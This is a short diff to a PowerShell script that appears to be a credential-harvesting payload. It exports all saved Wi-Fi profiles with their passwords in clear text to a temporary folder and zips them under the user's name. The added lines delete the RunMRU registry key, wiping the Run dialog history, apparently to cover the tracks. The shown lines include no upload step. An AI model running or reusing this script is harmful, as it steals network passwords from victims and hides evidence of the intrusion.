@@ -1,3 +1,5 @@
+$RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+Remove-Item -Path $RegistryPath
 mkdir $env:Temp\Netwerk
 netsh wlan export profile key=clear folder=$env:Temp\Netwerk
 Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
